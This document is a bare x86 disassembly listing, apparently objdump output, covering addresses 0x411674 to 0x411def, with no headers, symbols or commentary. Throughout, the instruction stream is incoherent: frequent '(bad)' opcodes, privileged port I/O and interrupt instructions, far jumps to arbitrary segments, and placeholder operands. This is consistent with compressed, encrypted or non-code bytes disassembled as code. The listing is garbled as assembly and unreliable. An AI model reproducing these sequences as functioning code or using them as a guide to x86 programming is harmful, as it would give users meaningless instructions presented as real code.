  411674:	mov    al,ds:0xa6ffff81
  411679:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41167a:	mov    eax,ds:0x20288197
  41167f:	mov    ?,WORD PTR [esi]
  411681:	aaa    
  411682:	push   ebp
  411683:	push   ecx
  411684:	xor    BYTE PTR [edx+0x3528c90c],bh
  41168a:	enter  0xa5af,0x9b
  41168e:	pop    ebx
  41168f:	mov    dl,0x46
  411691:	jnp    0x4116bf
  411693:	jo     0x411650
  411695:	mov    ebx,0x6397be29
  41169a:	dec    eax
  41169b:	dec    ebp
  41169c:	test   al,0xec
  41169e:	jns    0x411710
  4116a0:	pushf  
  4116a1:	xchg   ebp,eax
  4116a2:	push   cs
  4116a3:	aad    0xd4
  4116a5:	fwait
  4116a6:	sub    BYTE PTR [edx+eax*2+0x2711e8f0],0xf1
  4116ae:	outs   dx,BYTE PTR ds:[esi]
  4116af:	sbb    al,0xf
  4116b1:	pop    eax
  4116b2:	out    dx,eax
  4116b3:	clc    
  4116b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116b5:	fbld   TBYTE PTR [eax+0x7d]
  4116b8:	sbb    eax,0xe2bf3c74
  4116bd:	xchg   ecx,eax
  4116be:	pop    ecx
  4116bf:	mov    ds:0x942a207d,eax
  4116c4:	loope  0x411662
  4116c6:	daa    
  4116c7:	lods   eax,DWORD PTR ds:[esi]
  4116c8:	mov    edi,0x4d29f65b
  4116cd:	and    bl,0x3b
  4116d0:	ins    DWORD PTR es:[edi],dx
  4116d1:	lods   eax,DWORD PTR ds:[esi]
  4116d2:	jecxz  0x411697
  4116d4:	mov    BYTE PTR [esi-0x17fc002a],ah
  4116da:	nop
  4116db:	pop    esi
  4116dc:	(bad)  
  4116dd:	daa    
  4116de:	mov    esp,0x2aae5780
  4116e3:	aas    
  4116e4:	lea    edx,[ecx+eax*4+0x7dd41f01]
  4116eb:	(bad)  [edx-0x56]
  4116ee:	inc    esp
  4116ef:	sub    BYTE PTR [ebx],bh
  4116f1:	jmp    DWORD PTR [eax+0x7d]
  4116f4:	sbb    DWORD PTR [edi],eax
  4116f6:	and    al,0x72
  4116f8:	sub    ebp,ebp
  4116fa:	test   edi,edi
  4116fc:	jge    0x411740
  4116fe:	icebp  
  4116ff:	shl    eax,cl
  411701:	(bad)  
  411702:	mov    edx,0x33c5f071
  411707:	xchg   BYTE PTR [edx+0x63],bh
  41170a:	sbb    al,0x21
  41170c:	sub    dh,BYTE PTR [ebp-0x14566ad6]
  411712:	add    DWORD PTR [edi-0x163cfb69],eax
  411718:	in     eax,dx
  411719:	mov    bh,0xf1
  41171b:	outs   dx,BYTE PTR ds:[esi]
  41171c:	aaa    
  41171d:	jae    0x411705
  41171f:	add    ebx,ebx
  411721:	inc    ecx
  411722:	cmp    ebp,0x41
  411725:	adc    al,0x4d
  411727:	test   al,0xd8
  411729:	(bad)  
  41172a:	or     edi,DWORD PTR [edx-0x7d534af2]
  411730:	add    al,0xc5
  411732:	mov    bl,ch
  411734:	pusha  
  411735:	xchg   edi,eax
  411736:	sub    eax,0x649e4377
  41173b:	cs loopne 0x411720
  41173e:	dec    ebx
  41173f:	mov    edx,0xa00bb0ee
  411744:	ret    
  411745:	mov    bl,0x2a
  411747:	shl    DWORD PTR es:[esi*2+0x7827d6db],cl
  41174f:	in     al,0x44
  411751:	js     0x411744
  411753:	jne    0x411783
  411755:	xchg   edx,eax
  411756:	retf   
  411757:	(bad)  
  411759:	add    dl,BYTE PTR [ebp+ecx*8-0x76763ea7]
  411760:	jnp    0x4117bb
  411762:	out    dx,al
  411763:	sub    DWORD PTR [eax],eax
  411765:	sub    bh,dl
  411767:	rcl    BYTE PTR [esp+ebp*2],1
  41176a:	add    eax,0x85184c0d
  41176f:	ror    DWORD PTR [edi+0x406b8188],0xf2
  411776:	(bad)  
  411777:	mov    ch,0x14
  411779:	test   dh,0x24
  41177c:	adc    esi,eax
  41177e:	add    BYTE PTR [ebx],ah
  411780:	push   cs
  411781:	outs   dx,DWORD PTR ds:[esi]
  411782:	and    al,BYTE PTR [ebx-0x67]
  411785:	add    al,0x67
  411787:	jle    0x41179b
  411789:	and    al,0x6b
  41178b:	cmp    DWORD PTR ds:0x2103af7f,esi
  411791:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411792:	sub    BYTE PTR [ebp+edx*2-0x41],bl
  411796:	push   ebp
  411797:	sub    DWORD PTR [edi+0x25d4beaa],esp
  41179d:	retf   0xe6e7
  4117a0:	clc    
  4117a1:	inc    BYTE PTR [eax+0x3d]
  4117a4:	mov    ds:0xda81d436,al
  4117a9:	inc    ebp
  4117aa:	aaa    
  4117ab:	cmp    eax,DWORD PTR [eax]
  4117ad:	ds jp  0xb2cd867c
  4117b4:	pop    edx
  4117b5:	xchg   BYTE PTR [edi],al
  4117b7:	dec    edx
  4117b8:	stos   DWORD PTR es:[edi],eax
  4117b9:	add    DWORD PTR [ebp+0x32f996b7],esp
  4117bf:	out    0xf8,eax
  4117c1:	das    
  4117c2:	push   0xb94c806b
  4117c7:	shr    BYTE PTR [ebx-0x3e],1
  4117ca:	inc    esp
  4117cb:	cld    
  4117cc:	jmp    0x4117c2
  4117ce:	add    DWORD PTR [ebp+0x44f7f6da],esi
  4117d4:	cdq    
  4117d5:	push   ds
  4117d6:	cmp    BYTE PTR [edx+0x74],cl
  4117d9:	bsf    eax,DWORD PTR [eax-0x6aeae0a0]
  4117e0:	sbb    ebx,DWORD PTR [edi-0x2]
  4117e3:	mov    ebx,0x5184b3a7
  4117e8:	jns    0x4117cb
  4117ea:	das    
  4117eb:	dec    ax
  4117ed:	es inc edx
  4117ef:	sub    al,0x65
  4117f1:	(bad)  
  4117f2:	dec    ebp
  4117f3:	mov    al,ds:0x21b6940d
  4117f8:	fnstenv [edi+0x43492386]
  4117fe:	push   ebp
  4117ff:	push   ss
  411800:	aad    0xd8
  411802:	adc    dh,BYTE PTR [ebp-0x1a92b12b]
  411808:	mov    eax,ds:0xbe643012
  41180d:	push   ds
  41180e:	imul   DWORD PTR [ecx]
  411810:	cmp    DWORD PTR [esp+ebx*8+0x3c],edx
  411814:	lods   eax,DWORD PTR ds:[esi]
  411815:	psubsb mm0,QWORD PTR [eax-0x40666739]
  41181c:	stos   BYTE PTR es:[edi],al
  41181d:	cwde   
  41181e:	or     BYTE PTR [ebx-0x4a],bl
  411821:	(bad)  
  411822:	mov    bh,0x41
  411824:	dec    ecx
  411825:	add    eax,0x87ee171c
  41182a:	lahf   
  41182b:	xlat   BYTE PTR ds:[ebx]
  41182c:	xor    DWORD PTR [eax+0x718b01b4],ebp
  411832:	cmc    
  411833:	sti    
  411834:	scas   eax,DWORD PTR es:[edi]
  411835:	jp     0x411814
  411837:	aas    
  411838:	xor    cl,bl
  41183a:	pop    esp
  41183b:	xchg   ecx,eax
  41183c:	or     DWORD PTR [ebx-0x2d373183],0x77
  411843:	call   0xaaab:0x578614f0
  41184a:	call   FWORD PTR ds:[edi]
  41184d:	mov    edx,0xc2a0cfb1
  411852:	shl    DWORD PTR [edx-0x35],1
  411855:	cmp    DWORD PTR [eax+0x23],esi
  411858:	shl    DWORD PTR [ebx],1
  41185a:	jne    0x4118c1
  41185c:	gs inc ecx
  41185e:	ins    DWORD PTR es:[edi],dx
  41185f:	ins    BYTE PTR es:[edi],dx
  411860:	mov    edx,0x32466089
  411865:	sub    al,0x1b
  411867:	sub    ecx,DWORD PTR [ecx]
  411869:	in     al,0x80
  41186b:	xchg   esp,eax
  41186c:	in     al,dx
  41186d:	test   BYTE PTR [edi-0x7a],al
  411870:	outs   dx,DWORD PTR ds:[esi]
  411871:	sub    cl,BYTE PTR [esi+0x53536a3e]
  411877:	imul   esi,esi,0xd848f06e
  41187d:	outs   dx,DWORD PTR ds:[esi]
  41187e:	scas   eax,DWORD PTR es:[edi]
  41187f:	aas    
  411880:	mov    eax,ds:0x4bc3ccc5
  411885:	push   cs
  411886:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411887:	popa   
  411888:	pop    esp
  411889:	lahf   
  41188a:	jle    0x4118f3
  41188c:	dec    ebp
  41188d:	popf   
  41188e:	imul   BYTE PTR [esi-0x7f6bf937]
  411894:	loope  0x4118d0
  411896:	jmp    0xb85c49f
  41189b:	jge    0x411890
  41189d:	(bad)  
  41189e:	jns    0x4118d7
  4118a0:	(bad)  [esi-0x1f06959a]
  4118a6:	pop    esi
  4118a7:	out    0x7a,eax
  4118a9:	mov    ebx,0x5f84f0b
  4118ae:	xor    eax,0xfd4b5c24
  4118b3:	rol    BYTE PTR [eax],0x78
  4118b6:	dec    edx
  4118b7:	jmp    0x411870
  4118b9:	jle    0x41188c
  4118bb:	pop    esp
  4118bc:	fisttp QWORD PTR [ebp-0x2b66095a]
  4118c2:	mov    bl,0x16
  4118c4:	dec    esp
  4118c5:	imul   ecx,DWORD PTR [ecx+0x3fbd2f4f],0x41d435c
  4118cf:	cmp    bl,BYTE PTR [edi-0x16]
  4118d2:	sbb    ch,0x12
  4118d5:	(bad)  
  4118d6:	push   ds
  4118d7:	out    0xf5,eax
  4118d9:	icebp  
  4118da:	xlat   BYTE PTR ds:[ebx]
  4118db:	cmp    bl,BYTE PTR [ebx]
  4118dd:	into   
  4118de:	je     0x4118ff
  4118e0:	leave  
  4118e1:	outs   dx,DWORD PTR ds:[esi]
  4118e2:	pop    eax
  4118e3:	out    0x44,al
  4118e5:	lods   eax,DWORD PTR ds:[esi]
  4118e6:	and    cl,BYTE PTR [ebx]
  4118e8:	or     eax,0x413e03be
  4118ed:	stos   BYTE PTR es:[edi],al
  4118ee:	inc    eax
  4118ef:	xor    eax,0x31fec48d
  4118f4:	cs jecxz 0x411963
  4118f7:	iret   
  4118f8:	sbb    eax,0x889ba6d6
  4118fd:	and    eax,0x8e3c6b46
  411902:	jl     0x41197e
  411904:	add    eax,0x58a4c9d2
  411909:	pop    ebp
  41190a:	test   BYTE PTR [ecx],cl
  41190c:	pop    eax
  41190d:	sti    
  41190e:	sti    
  41190f:	pop    edi
  411910:	cmp    BYTE PTR [eax+edi*8+0x56],dh
  411914:	xchg   BYTE PTR [eax+0x66bd28af],al
  41191a:	sbb    DWORD PTR [eax],ebp
  41191c:	sub    al,cl
  41191e:	add    eax,0x50b95a34
  411923:	mov    edi,0x88ec9df4
  411929:	mov    bl,0x88
  41192b:	lahf   
  41192c:	jo     0x411928
  41192e:	inc    edi
  41192f:	add    BYTE PTR fs:[edi+0x56],0x3b
  411934:	out    0x8a,al
  411936:	out    0x63,al
  411938:	xchg   edi,eax
  411939:	cmp    DWORD PTR [ebp+ecx*4+0x7469a34e],edi
  411940:	sbb    ch,ah
  411942:	inc    ecx
  411943:	and    eax,0xdfb328b3
  411948:	mov    ah,0xa5
  41194a:	mov    esp,?
  41194c:	not    esi
  41194e:	cmp    BYTE PTR [ebp-0x54],dh
  411951:	inc    ebp
  411952:	xchg   ebp,eax
  411953:	mov    cl,0x67
  411955:	stos   DWORD PTR es:[edi],eax
  411956:	xchg   ebx,eax
  411957:	(bad)  
  411958:	daa    
  411959:	sbb    al,0x33
  41195b:	not    DWORD PTR [esi+0x8d03954]
  411961:	test   eax,0xf01f3c23
  411966:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411967:	push   DWORD PTR [ecx+0x3434c2e0]
  41196d:	sbb    al,0x5
  41196f:	cmp    eax,0x70ab6640
  411974:	dec    esi
  411975:	sbb    BYTE PTR [ecx],bh
  411977:	out    0x56,al
  411979:	lahf   
  41197a:	pushf  
  41197b:	pusha  
  41197c:	shr    BYTE PTR [esi+0x25192903],1
  411982:	fs pop ds
  411984:	fsub   st(7),st
  411986:	cmp    al,0x49
  411988:	(bad)  
  411989:	fs pop ebp
  41198b:	test   eax,0x27215270
  411990:	inc    edi
  411991:	push   0x6b528338
  411996:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411997:	shr    bh,1
  411999:	add    eax,0x3142d947
  41199e:	add    ebx,DWORD PTR [eax+0x4a03cfd4]
  4119a4:	popf   
  4119a5:	rcl    BYTE PTR [esi],1
  4119a7:	mov    bl,0x63
  4119a9:	call   0x36e6:0x7bb87e5f
  4119b0:	fild   DWORD PTR [ecx+0x389ee54c]
  4119b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119b7:	lea    eax,[eax+0x2c]
  4119ba:	jbe    0x411963
  4119bc:	lods   al,BYTE PTR ds:[esi]
  4119bd:	pop    ebp
  4119be:	outs   dx,DWORD PTR ds:[esi]
  4119bf:	(bad)  
  4119c0:	jno    0x4119c5
  4119c2:	xchg   esi,eax
  4119c3:	xchg   edx,ecx
  4119c5:	add    eax,0x7e497146
  4119ca:	aaa    
  4119cb:	aam    0x45
  4119cd:	test   al,0xae
  4119cf:	inc    esi
  4119d0:	iret   
  4119d1:	pop    ebx
  4119d2:	inc    ecx
  4119d3:	lea    esi,[edx-0x3e]
  4119d6:	sbb    eax,0xee93a064
  4119db:	ret    
  4119dc:	cmp    DWORD PTR [edi],ebp
  4119de:	mov    ds:0x8d8d7f38,eax
  4119e3:	lods   al,BYTE PTR ds:[esi]
  4119e4:	lock fild DWORD PTR [edx-0x74]
  4119e8:	dec    ecx
  4119e9:	or     eax,0x27945fa2
  4119ef:	or     edi,DWORD PTR [edi-0x1c1b81e1]
  4119f5:	outs   dx,DWORD PTR ds:[esi]
  4119f6:	ficom  DWORD PTR [eax+0x4d]
  4119f9:	push   ss
  4119fa:	inc    ebp
  4119fb:	scas   eax,DWORD PTR es:[edi]
  4119fc:	pop    esp
  4119fd:	mov    ebx,0x4615927e
  411a02:	and    al,0x88
  411a04:	out    0xfa,al
  411a06:	jl     0x4119ad
  411a08:	sbb    al,0x21
  411a0a:	or     bl,BYTE PTR [esi-0x4e]
  411a0d:	inc    esp
  411a0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a10:	mov    ebp,0xdf7857c4
  411a15:	push   0x102077ec
  411a1a:	or     eax,0xd0b914e4
  411a1f:	int    0x6f
  411a21:	das    
  411a22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a23:	imul   ecx,DWORD PTR [eax-0x24],0x1eda553b
  411a2a:	sahf   
  411a2b:	inc    ebx
  411a2c:	jl     0x411a17
  411a2e:	out    0xf0,eax
  411a30:	xchg   ecx,eax
  411a31:	jo     0x411a18
  411a33:	jmp    0x3e0c:0x45dfecd2
  411a3a:	dec    esp
  411a3b:	fimul  DWORD PTR [ebp-0x6]
  411a3e:	mov    BYTE PTR [eax-0x25],0x69
  411a42:	(bad)  
  411a43:	rcr    DWORD PTR [eax],cl
  411a45:	test   eax,0xff2aa7f5
  411a4a:	jae    0x4119da
  411a4c:	in     al,0xc4
  411a4e:	lea    esp,[esi-0x301b97e7]
  411a54:	in     eax,dx
  411a55:	out    dx,eax
  411a56:	int    0xa2
  411a58:	in     al,0x52
  411a5a:	mov    eax,ds:0x60162ce2
  411a5f:	popa   
  411a60:	lods   eax,DWORD PTR ds:[esi]
  411a61:	jp     0x411a7a
  411a63:	enter  0x5e81,0x38
  411a67:	push   eax
  411a68:	sti    
  411a69:	in     eax,dx
  411a6a:	push   ss
  411a6b:	jge    0x411aa1
  411a6d:	sub    DWORD PTR [eax],0xffffffc2
  411a70:	leave  
  411a71:	dec    edi
  411a72:	add    ecx,DWORD PTR [eax]
  411a74:	cwde   
  411a75:	dec    edx
  411a76:	jle    0x411ae6
  411a78:	mov    ch,BYTE PTR [ebp+edi*1-0x70be4ec4]
  411a7f:	popf   
  411a80:	pop    edi
  411a81:	mov    es:0xc0bba35b,eax
  411a87:	mov    edi,0x56d84d99
  411a8c:	sti    
  411a8d:	int    0x7b
  411a8f:	pop    ebx
  411a90:	aad    0xd0
  411a92:	inc    ebx
  411a93:	jmp    0x3cf2:0xadb66602
  411a9a:	push   esp
  411a9b:	lahf   
  411a9c:	(bad)  
  411a9d:	mov    esi,0x33c12021
  411aa2:	pop    ecx
  411aa3:	inc    edi
  411aa4:	inc    ecx
  411aa5:	out    0x7e,eax
  411aa7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411aa8:	pop    ds
  411aa9:	jg     0x411b01
  411aab:	jmp    0xe373a1c1
  411ab0:	jmp    0x25d1:0x2f81270
  411ab7:	into   
  411ab8:	push   ebp
  411ab9:	imul   ebx,DWORD PTR [ebp+0x36],0x45379fe1
  411ac0:	scas   al,BYTE PTR es:[edi]
  411ac1:	daa    
  411ac2:	xchg   esi,eax
  411ac3:	mov    edx,DWORD PTR [ebx-0x6]
  411ac6:	out    0xb7,eax
  411ac8:	sub    DWORD PTR [ebp-0x5faabc69],ebp
  411ace:	dec    ebx
  411acf:	aas    
  411ad0:	sub    BYTE PTR [esi-0x7bd79beb],dh
  411ad6:	(bad)  
  411ad7:	pop    edx
  411ad8:	push   ebx
  411ad9:	jl     0x411a5c
  411adb:	fwait
  411adc:	stos   DWORD PTR es:[edi],eax
  411add:	loopne 0x411a6a
  411adf:	imul   ebp,DWORD PTR [eax],0xca7f50d1
  411ae5:	push   edx
  411ae6:	xchg   ecx,eax
  411ae7:	xor    ch,BYTE PTR es:[esi+0x29]
  411aeb:	ret    
  411aec:	add    eax,0x487c5239
  411af1:	rol    DWORD PTR [ebp-0xd],1
  411af4:	aaa    
  411af5:	mov    ds:0xe561c02f,al
  411afa:	icebp  
  411afb:	pop    ebx
  411afc:	inc    eax
  411afd:	out    0xf7,eax
  411aff:	(bad)  
  411b01:	xchg   esp,eax
  411b02:	mov    edx,0x800e1a6
  411b07:	push   DWORD PTR [edx]
  411b09:	data16 add bl,cl
  411b0c:	xchg   ebx,eax
  411b0d:	sbb    al,0x75
  411b0f:	add    eax,0xb4cb10c0
  411b14:	shr    BYTE PTR [edx+0x20dc32ab],1
  411b1a:	in     al,dx
  411b1b:	mov    ch,0x2
  411b1d:	lds    eax,FWORD PTR [eax-0x151b38f0]
  411b23:	xchg   esi,eax
  411b24:	fisttp QWORD PTR [eax]
  411b26:	xor    ecx,DWORD PTR [edi]
  411b28:	aad    0x63
  411b2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b2b:	mov    edx,0xf61d089c
  411b30:	retf   0x43f8
  411b33:	push   ecx
  411b34:	adc    esp,DWORD PTR [edi]
  411b36:	lods   eax,DWORD PTR ds:[esi]
  411b37:	int3   
  411b38:	(bad)  
  411b39:	in     eax,0xe7
  411b3b:	cld    
  411b3c:	dec    eax
  411b3d:	and    ch,BYTE PTR [ebp+eiz*4+0x27]
  411b41:	xor    edi,DWORD PTR [ecx+0x7452dc83]
  411b47:	sbb    al,0x52
  411b49:	xchg   edi,eax
  411b4a:	sub    esi,DWORD PTR [ebp+0x69]
  411b4d:	int3   
  411b4e:	mov    ebx,0x6897641a
  411b53:	and    ecx,DWORD PTR [ebp+0x52f50d02]
  411b59:	sahf   
  411b5a:	push   ecx
  411b5b:	loopne 0x411b09
  411b5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b5e:	je     0x411af2
  411b60:	mov    bh,bh
  411b62:	jl     0x411b82
  411b64:	ror    BYTE PTR [edx-0x65],1
  411b67:	cli    
  411b68:	mov    bh,0x6e
  411b6a:	sub    eax,0x1b718826
  411b70:	mov    al,ds:0x5975de27
  411b75:	pushf  
  411b76:	push   ss
  411b77:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  411b79:	in     eax,dx
  411b7a:	in     eax,dx
  411b7b:	retf   0xec76
  411b7e:	fisttp QWORD PTR [esi-0x6e]
  411b81:	pop    ebx
  411b82:	lds    ebx,FWORD PTR [edi+0x3780cb3]
  411b88:	mov    dl,0x27
  411b8a:	jl     0x411bd9
  411b8c:	or     al,BYTE PTR [esi-0x4e]
  411b8f:	mov    ecx,ecx
  411b91:	push   ecx
  411b92:	leave  
  411b93:	lahf   
  411b94:	inc    edi
  411b95:	inc    esp
  411b96:	pop    esp
  411b97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b98:	imul   BYTE PTR [esp+ecx*8+0x57]
  411b9c:	jge    0x411b6d
  411b9e:	pop    DWORD PTR [esi-0x71a7e08c]
  411ba4:	pop    ds
  411ba5:	hlt    
  411ba6:	test   al,0xf4
  411ba8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ba9:	in     al,dx
  411baa:	jns    0x411c18
  411bac:	shl    dh,cl
  411bae:	in     al,dx
  411baf:	mov    dl,0x1b
  411bb1:	push   ebx
  411bb2:	ja     0x411b7d
  411bb4:	mov    esi,0xe43bcb96
  411bb9:	fwait
  411bba:	out    0xba,al
  411bbc:	test   DWORD PTR [edi-0x5ea1abd7],esp
  411bc2:	inc    edx
  411bc3:	leave  
  411bc4:	inc    ebx
  411bc5:	dec    ebp
  411bc6:	mov    ah,0xb1
  411bc8:	fcmove st,st(6)
  411bca:	xor    eax,0x6a5bcf9
  411bcf:	or     esi,DWORD PTR ds:0x72af9be8
  411bd5:	sub    esp,DWORD PTR [ebp+0x29]
  411bd8:	sar    BYTE PTR [ecx],cl
  411bda:	retf   0x92ae
  411bdd:	mov    ss,WORD PTR [edx+eiz*4]
  411be0:	or     eax,DWORD PTR [esi+0x37]
  411be3:	add    DWORD PTR [edx+ebx*4+0x76],0x24
  411be8:	dec    eax
  411be9:	add    edx,0xffffffdc
  411bec:	cmp    ah,bl
  411bee:	xor    cl,bh
  411bf0:	or     BYTE PTR [ecx],0x94
  411bf3:	inc    esi
  411bf4:	stos   BYTE PTR es:[edi],al
  411bf5:	pop    ebp
  411bf6:	or     DWORD PTR [ecx],edx
  411bf8:	loope  0x411b90
  411bfa:	adc    DWORD PTR [eax-0x5473e6f7],ebp
  411c00:	mov    ebx,0xb9da483f
  411c05:	cld    
  411c06:	push   esp
  411c07:	jecxz  0x411c0e
  411c09:	cli    
  411c0a:	push   eax
  411c0b:	addr16 mov edi,0x92cd9533
  411c11:	mov    bh,0xc5
  411c13:	aaa    
  411c14:	stos   BYTE PTR es:[edi],al
  411c15:	sbb    edi,DWORD PTR [ebx]
  411c17:	mov    al,0x2
  411c19:	ret    0x6648
  411c1c:	add    DWORD PTR [edi+ebp*2],esi
  411c1f:	jecxz  0x411c11
  411c21:	pop    esp
  411c22:	push   ds
  411c23:	sbb    ah,ah
  411c25:	adc    al,0xbd
  411c27:	mov    al,ds:0xc97de628
  411c2c:	lods   al,BYTE PTR ds:[esi]
  411c2d:	scas   eax,DWORD PTR es:[edi]
  411c2e:	data16 daa 
  411c30:	iret   
  411c31:	rol    DWORD PTR [ebx],0x75
  411c34:	cli    
  411c35:	scas   al,BYTE PTR es:[edi]
  411c36:	pusha  
  411c37:	out    0xe1,eax
  411c39:	(bad)  
  411c3a:	push   ss
  411c3b:	outs   dx,DWORD PTR ds:[esi]
  411c3c:	retf   0x6461
  411c3f:	xchg   DWORD PTR [esi+0x7f],esp
  411c42:	dec    ecx
  411c43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c44:	or     edi,DWORD PTR [edi]
  411c46:	inc    ebx
  411c47:	push   edi
  411c48:	add    al,0xe2
  411c4a:	dec    ecx
  411c4b:	inc    eax
  411c4c:	mov    bl,0xcc
  411c4e:	ds cs add bh,dh
  411c52:	sub    al,ch
  411c54:	or     al,0x80
  411c56:	sub    bh,BYTE PTR [edx]
  411c58:	int    0x47
  411c5a:	mov    WORD PTR [eax-0x25],gs
  411c5d:	push   edi
  411c5e:	cdq    
  411c5f:	cmp    esp,DWORD PTR [edx+0x6f]
  411c62:	mov    bh,0xbb
  411c64:	out    dx,al
  411c65:	pop    edi
  411c66:	lock adc eax,0x215248e5
  411c6c:	mov    al,BYTE PTR [ecx-0x49]
  411c6f:	test   BYTE PTR [ebx],cl
  411c71:	xchg   esi,eax
  411c72:	fdiv   DWORD PTR [ebp+0x7d]
  411c75:	js     0x411cf6
  411c77:	fnstsw WORD PTR [esi]
  411c79:	popa   
  411c7a:	stc    
  411c7b:	jbe    0x411cd1
  411c7d:	(bad)  
  411c7e:	xchg   ebp,eax
  411c7f:	push   esi
  411c80:	jne    0x411c5c
  411c82:	ins    DWORD PTR es:[edi],dx
  411c83:	test   al,0x9f
  411c85:	dec    ebp
  411c86:	add    eax,0x869f9959
  411c8b:	sbb    bl,BYTE PTR [ecx-0x359b6d85]
  411c91:	add    al,0x4d
  411c93:	xchg   edx,eax
  411c94:	js     0x411c99
  411c96:	jno    0x411cee
  411c98:	inc    esp
  411c99:	fnstenv [ebx]
  411c9b:	(bad)  
  411c9c:	mov    al,ds:0x8a566f7
  411ca1:	fsubr  st,st(7)
  411ca3:	ins    BYTE PTR es:[edi],dx
  411ca4:	sbb    edi,ebp
  411ca6:	mov    BYTE PTR [ecx],cl
  411ca8:	jae    0x411c7c
  411caa:	aad    0xdc
  411cac:	adc    BYTE PTR [esi+0xc6f546b],al
  411cb2:	aam    0xa8
  411cb4:	fcom   QWORD PTR [ebx+0x38595e10]
  411cba:	aas    
  411cbb:	popf   
  411cbc:	jmp    0xffd1:0x41094a9e
  411cc3:	mov    al,0xc1
  411cc5:	(bad)  
  411cc6:	sar    BYTE PTR [ebp+0x7a],1
  411cc9:	jno    0x411c9d
  411ccb:	retf   
  411ccc:	stc    
  411ccd:	add    eax,0x4426919e
  411cd2:	or     ebx,DWORD PTR [edx-0x3db5718b]
  411cd8:	xchg   edx,eax
  411cd9:	ficom  DWORD PTR [edi-0x37a5170e]
  411cdf:	(bad)  
  411ce0:	int    0xb0
  411ce2:	mov    al,dl
  411ce4:	mov    es,ebp
  411ce6:	pop    esi
  411ce7:	pop    es
  411ce8:	mov    ecx,DWORD PTR [si-0x6e]
  411cec:	out    0xc7,al
  411cee:	or     dh,BYTE PTR ds:0x1f987a79
  411cf4:	jge    0x411d28
  411cf6:	sbb    DWORD PTR [ebx],0x7f
  411cf9:	lods   al,BYTE PTR fs:[esi]
  411cfb:	outs   dx,BYTE PTR ds:[esi]
  411cfc:	lods   al,BYTE PTR ds:[esi]
  411cfd:	jb     0x411d5c
  411cff:	jle    0x411d0c
  411d01:	lods   al,BYTE PTR ds:[esi]
  411d02:	add    eax,0x875f1859
  411d07:	ret    
  411d08:	jno    0x411cef
  411d0a:	ror    dl,0xab
  411d0d:	mov    dh,0xd5
  411d0f:	aaa    
  411d10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d11:	jl     0x411d32
  411d13:	dec    edi
  411d14:	mov    eax,ds:0xd023e041
  411d19:	test   BYTE PTR [ebx-0x608e36dd],dl
  411d1f:	hlt    
  411d20:	mov    esi,DWORD PTR [ebx-0x48]
  411d23:	and    ebp,0x58
  411d26:	outs   dx,BYTE PTR ds:[esi]
  411d27:	inc    edx
  411d28:	clc    
  411d29:	mov    al,0x9f
  411d2b:	or     eax,0x58be2282
  411d30:	arpl   WORD PTR [eax+0x78a2d2af],dx
  411d36:	jnp    0x411d8e
  411d38:	rcr    BYTE PTR [edi+0x58],1
  411d3b:	mov    gs,WORD PTR [ebx+0xa]
  411d3e:	push   0x3e
  411d40:	cmp    BYTE PTR ds:0x81be461d,dl
  411d46:	repnz cmp DWORD PTR ds:0x7a10264e,esi
  411d4d:	ret    0xc23c
  411d50:	aam    0x55
  411d52:	push   esi
  411d53:	mov    edi,?
  411d55:	ret    0xd0ea
  411d58:	int    0x1f
  411d5a:	rcl    ah,0x96
  411d5d:	scas   eax,DWORD PTR es:[edi]
  411d5e:	stos   DWORD PTR es:[edi],eax
  411d5f:	jmp    0x411d38
  411d61:	(bad)  
  411d62:	push   edi
  411d63:	adc    al,0x36
  411d65:	pop    edi
  411d66:	dec    esp
  411d67:	mov    ecx,?
  411d69:	into   
  411d6a:	mov    al,0x14
  411d6c:	sbb    ch,BYTE PTR [ebx-0x3e]
  411d6f:	pop    edi
  411d70:	mov    bh,0xe3
  411d72:	rep lods eax,DWORD PTR ds:[esi]
  411d74:	xlat   BYTE PTR ds:[ebx]
  411d75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d76:	pop    es
  411d77:	fmul   DWORD PTR [ebp-0x1e909947]
  411d7d:	or     al,0xad
  411d7f:	push   ebx
  411d80:	enter  0x3e92,0x35
  411d84:	or     ah,BYTE PTR [esi]
  411d86:	mov    dh,0x6f
  411d88:	rol    eax,0xbc
  411d8b:	or     al,0x27
  411d8d:	jbe    0x411df2
  411d8f:	push   es
  411d90:	aaa    
  411d91:	push   ss
  411d92:	fdivp  st(4),st
  411d94:	or     eax,0xa74dc0af
  411d99:	or     eax,0xf2713c35
  411d9e:	push   edx
  411d9f:	sub    al,0x5e
  411da2:	inc    esi
  411da3:	sub    al,0xc1
  411da5:	fimul  WORD PTR [esi+0x6d]
  411da8:	or     edi,DWORD PTR [eax+0x4eb443d1]
  411dae:	jmp    0x86ca:0x2890c4ca
  411db5:	daa    
  411db6:	adc    bl,BYTE PTR [ebx-0x7]
  411db9:	jmp    0x179b:0xa41d900b
  411dc0:	sbb    esi,DWORD PTR [esi+esi*4+0x4dff6004]
  411dc7:	in     eax,0x7b
  411dc9:	xor    dl,al
  411dcb:	pop    ebx
  411dcc:	fild   DWORD PTR [esi+0x2ae34b67]
  411dd2:	lahf   
  411dd3:	adc    DWORD PTR [ecx-0x5909f8ac],eax
  411dd9:	sub    eax,0xca650deb
  411dde:	jmp    FWORD PTR [edi+0xf853b96]
  411de4:	pop    ds
  411de5:	add    bh,BYTE PTR [edi+0x14]
  411de8:	dec    eax
  411de9:	push   edx
  411dea:	rcl    edx,cl
  411dec:	jge    0x411e10
  411dee:	push   edx
  411def:	add    eax,0x84f3541
